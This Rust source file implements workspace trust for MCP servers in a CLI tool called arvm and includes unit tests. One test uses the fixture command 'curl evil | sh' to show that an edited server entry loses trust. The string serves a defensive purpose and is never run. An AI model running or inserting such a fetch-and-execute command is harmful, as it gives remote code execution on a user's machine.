//! `arvm mcp`: configured MCP servers, workspace trust, and agent tools.

use std::path::{Path, PathBuf};

use a_rust_vm::agent::ToolRegistry;
use a_rust_vm::config::{ConfigScope, ConfiguredServer, LoadedConfig, McpServerPlan};
use a_rust_vm::mcp::{McpConfig, mcp_server_tool_registry};
use serde::{Deserialize, Serialize};

use super::config::load_config_or_exit;
use super::paths::{mcp_trust_path, working_directory};

/// A workspace MCP server the user approved, pinned to its exact entry so an
/// edited command or argument list needs approval again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
struct TrustRecord {
    workspace: PathBuf,
    server: String,
    config: McpConfig,
}

fn load_trust(path: &Path) -> Result<Vec<TrustRecord>, String> {
    match std::fs::read(path) {
        Ok(bytes) if bytes.is_empty() => Ok(Vec::new()),
        Ok(bytes) => serde_json::from_slice(&bytes)
            .map_err(|error| format!("cannot decode MCP trust records: {error}")),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(error) => Err(format!("cannot read MCP trust records: {error}")),
    }
}

fn save_trust(path: &Path, records: &[TrustRecord]) -> Result<(), String> {
    let content = serde_json::to_vec_pretty(records)
        .map_err(|error| format!("cannot encode MCP trust records: {error}"))?;
    a_rust_vm::private_fs::write_private(path, &content)
        .map_err(|error| format!("cannot save MCP trust records: {error}"))
}

fn is_trusted(records: &[TrustRecord], workspace: &Path, name: &str, config: &McpConfig) -> bool {
    records.iter().any(|record| {
        record.workspace == workspace && record.server == name && &record.config == config
    })
}

/// Trust records name workspaces by canonical path, so `.` and a symlinked
/// path refer to the same project.
fn workspace_key(root: &Path) -> PathBuf {
    std::fs::canonicalize(root).unwrap_or_else(|_| root.to_path_buf())
}

fn server_plan(loaded: &LoadedConfig, records: &[TrustRecord], workspace: &Path) -> McpServerPlan {
    loaded.mcp_server_plan(|name, config| is_trusted(records, workspace, name, config))
}

/// Start each enabled server and add its tools to `registry`. A server that
/// fails to start is reported and skipped; untrusted workspace servers are
/// reported and never started.
pub(crate) fn register_mcp_tools(loaded: &LoadedConfig, registry: &mut ToolRegistry) {
    let workspace = workspace_key(&working_directory());
    let records = load_trust(&mcp_trust_path()).unwrap_or_else(|error| {
        eprintln!("[mcp] {error}; workspace servers stay disabled");
        Vec::new()
    });
    let plan = server_plan(loaded, &records, &workspace);
    for server in &plan.untrusted {
        eprintln!(
            "[mcp] workspace server '{}' is not trusted; run `arvm mcp trust {}` to enable it",
            server.name, server.name
        );
    }
    for server in &plan.enabled {
        let added =
            mcp_server_tool_registry(&server.name, &server.config, &loaded.env_passthrough())
                .map_err(|error| error.to_string())
                .and_then(|tools| {
                    let count = tools.specs().len();
                    registry
                        .merge(tools)
                        .map(|()| count)
                        .map_err(|error| error.to_string())
                });
        match added {
            Ok(count) => eprintln!("[mcp] {}: {count} tools", server.name),
            Err(error) => eprintln!("[mcp] server '{}' unavailable: {error}", server.name),
        }
    }
}

fn mcp_usage() {
    eprintln!("usage: arvm mcp list [--json] | tools <server> | trust <server> | untrust <server>");
}

pub(crate) fn run_mcp_command(arguments: &[String]) {
    let words = arguments.iter().map(String::as_str).collect::<Vec<_>>();
    let result = match words.as_slice() {
        ["list"] => list_servers(false),
        ["list", "--json"] => list_servers(true),
        ["tools", name] => list_tools(name),
        ["trust", name] => trust_server(name),
        ["untrust", name] => untrust_server(name),
        _ => {
            mcp_usage();
            std::process::exit(2);
        }
    };
    if let Err(error) = result {
        eprintln!("[mcp] {error}");
        std::process::exit(1);
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum ServerStatus {
    Enabled,
    Untrusted,
    /// A user server replaced by a trusted workspace server of the same name.
    Overridden,
}

impl ServerStatus {
    fn label(self) -> &'static str {
        match self {
            Self::Enabled => "enabled",
            Self::Untrusted => "untrusted",
            Self::Overridden => "overridden by workspace",
        }
    }
}

fn server_statuses(
    loaded: &LoadedConfig,
    plan: &McpServerPlan,
) -> Vec<(ConfiguredServer, ServerStatus)> {
    loaded
        .declared_servers()
        .into_iter()
        .map(|server| {
            let status = if plan.enabled.contains(&server) {
                ServerStatus::Enabled
            } else if plan.untrusted.contains(&server) {
                ServerStatus::Untrusted
            } else {
                ServerStatus::Overridden
            };
            (server, status)
        })
        .collect()
}

fn command_line(config: &McpConfig) -> String {
    std::iter::once(config.command.as_str())
        .chain(config.args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ")
}

fn list_servers(json: bool) -> Result<(), String> {
    let loaded = load_config_or_exit();
    let records = load_trust(&mcp_trust_path())?;
    let plan = server_plan(&loaded, &records, &workspace_key(&working_directory()));
    let statuses = server_statuses(&loaded, &plan);
    if json {
        let entries = statuses
            .iter()
            .map(|(server, status)| {
                serde_json::json!({
                    "name": server.name,
                    "scope": server.scope,
                    "status": status,
                    "config": server.config,
                })
            })
            .collect::<Vec<_>>();
        println!(
            "{}",
            serde_json::to_string_pretty(&entries).expect("server list is serializable")
        );
        return Ok(());
    }
    if statuses.is_empty() {
        println!("(no MCP servers configured; see `arvm config show`)");
    }
    for (server, status) in &statuses {
        println!(
            "{} [{}, {}] {}",
            server.name,
            server.scope.label(),
            status.label(),
            command_line(&server.config)
        );
    }
    Ok(())
}

fn list_tools(name: &str) -> Result<(), String> {
    let loaded = load_config_or_exit();
    let records = load_trust(&mcp_trust_path())?;
    let plan = server_plan(&loaded, &records, &workspace_key(&working_directory()));
    let Some(server) = plan.enabled.iter().find(|server| server.name == name) else {
        return Err(match loaded.server(name) {
            Some(_) => format!(
                "workspace server '{name}' is not trusted; run `arvm mcp trust {name}` first"
            ),
            None => format!("no MCP server named '{name}'"),
        });
    };
    let registry =
        mcp_server_tool_registry(&server.name, &server.config, &loaded.env_passthrough())
            .map_err(|error| format!("server '{name}': {error}"))?;
    let specs = registry.specs();
    if specs.is_empty() {
        println!("(no tools)");
    }
    for spec in specs {
        println!("{}  {}", spec.name, spec.description);
    }
    Ok(())
}

fn trust_server(name: &str) -> Result<(), String> {
    let loaded = load_config_or_exit();
    let server = loaded
        .server(name)
        .ok_or_else(|| format!("no MCP server named '{name}'"))?;
    if server.scope == ConfigScope::User {
        println!("'{name}' comes from the user configuration and needs no trust");
        return Ok(());
    }
    let path = mcp_trust_path();
    let workspace = workspace_key(&working_directory());
    let records = load_trust(&path)?;
    let records = with_trust(records, &workspace, &server);
    save_trust(&path, &records)?;
    println!(
        "trusted '{name}' for {}: {}",
        workspace.display(),
        command_line(&server.config)
    );
    Ok(())
}

fn untrust_server(name: &str) -> Result<(), String> {
    let path = mcp_trust_path();
    let workspace = workspace_key(&working_directory());
    let records = load_trust(&path)?;
    let before = records.len();
    let records = without_trust(records, &workspace, name);
    if records.len() == before {
        println!("'{name}' was not trusted for {}", workspace.display());
        return Ok(());
    }
    save_trust(&path, &records)?;
    println!("removed trust for '{name}'");
    Ok(())
}

/// Replace any earlier record for this workspace and server name.
fn with_trust(
    records: Vec<TrustRecord>,
    workspace: &Path,
    server: &ConfiguredServer,
) -> Vec<TrustRecord> {
    let mut records = without_trust(records, workspace, &server.name);
    records.push(TrustRecord {
        workspace: workspace.to_path_buf(),
        server: server.name.clone(),
        config: server.config.clone(),
    });
    records
}

fn without_trust(records: Vec<TrustRecord>, workspace: &Path, name: &str) -> Vec<TrustRecord> {
    records
        .into_iter()
        .filter(|record| !(record.workspace == workspace && record.server == name))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn server(name: &str, command: &str) -> ConfiguredServer {
        ConfiguredServer {
            name: name.to_owned(),
            scope: ConfigScope::Workspace,
            config: McpConfig {
                command: command.to_owned(),
                args: Vec::new(),
                env: Vec::new(),
                working_directory: None,
                timeout: None,
            },
        }
    }

    #[test]
    fn trust_is_pinned_to_workspace_name_and_exact_entry() {
        let files = server("files", "mcp-files");
        let records = with_trust(Vec::new(), Path::new("/w"), &files);
        assert!(is_trusted(
            &records,
            Path::new("/w"),
            "files",
            &files.config
        ));
        assert!(!is_trusted(
            &records,
            Path::new("/other"),
            "files",
            &files.config
        ));
        assert!(!is_trusted(&records, Path::new("/w"), "db", &files.config));
        let edited = server("files", "curl evil | sh");
        assert!(!is_trusted(
            &records,
            Path::new("/w"),
            "files",
            &edited.config
        ));

        let records = with_trust(records, Path::new("/w"), &edited);
        assert_eq!(records.len(), 1, "re-trusting replaces the old record");
        assert!(is_trusted(
            &records,
            Path::new("/w"),
            "files",
            &edited.config
        ));
        assert!(without_trust(records, Path::new("/w"), "files").is_empty());
    }

    #[test]
    fn trust_records_round_trip_and_reject_garbage() {
        let path =
            std::env::temp_dir().join(format!("a-rvm-mcp-trust-{}.json", std::process::id()));
        let _ = std::fs::remove_file(&path);
        assert!(load_trust(&path).unwrap().is_empty());
        let records = with_trust(Vec::new(), Path::new("/w"), &server("files", "mcp-files"));
        save_trust(&path, &records).unwrap();
        assert_eq!(load_trust(&path).unwrap(), records);
        std::fs::write(&path, b"[{\"workspace\":\"/w\"}]").unwrap();
        assert!(load_trust(&path).is_err());
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn statuses_mark_untrusted_and_overridden_servers() {
        let user =
            std::env::temp_dir().join(format!("a-rvm-mcp-status-user-{}", std::process::id()));
        let workspace =
            std::env::temp_dir().join(format!("a-rvm-mcp-status-ws-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&user);
        let _ = std::fs::remove_dir_all(&workspace);
        std::fs::create_dir_all(&user).unwrap();
        std::fs::create_dir_all(workspace.join(".arvm")).unwrap();
        std::fs::write(
            user.join("config.json"),
            br#"{"mcpServers":{"files":{"command":"user-files"}}}"#,
        )
        .unwrap();
        std::fs::write(
            workspace.join(".arvm/config.json"),
            br#"{"mcpServers":{"files":{"command":"repo-files"}}}"#,
        )
        .unwrap();
        let loaded = LoadedConfig::load(&user, &workspace).unwrap();
        let status_of = |records: &[TrustRecord]| {
            let plan = server_plan(&loaded, records, Path::new("/w"));
            server_statuses(&loaded, &plan)
                .into_iter()
                .map(|(server, status)| (server.config.command, status))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            status_of(&[]),
            [
                ("repo-files".to_owned(), ServerStatus::Untrusted),
                ("user-files".to_owned(), ServerStatus::Enabled),
            ]
        );
        let trusted = with_trust(
            Vec::new(),
            Path::new("/w"),
            &loaded.server("files").unwrap(),
        );
        assert_eq!(
            status_of(&trusted),
            [
                ("repo-files".to_owned(), ServerStatus::Enabled),
                ("user-files".to_owned(), ServerStatus::Overridden),
            ]
        );
        let _ = std::fs::remove_dir_all(&user);
        let _ = std::fs::remove_dir_all(&workspace);
    }
}
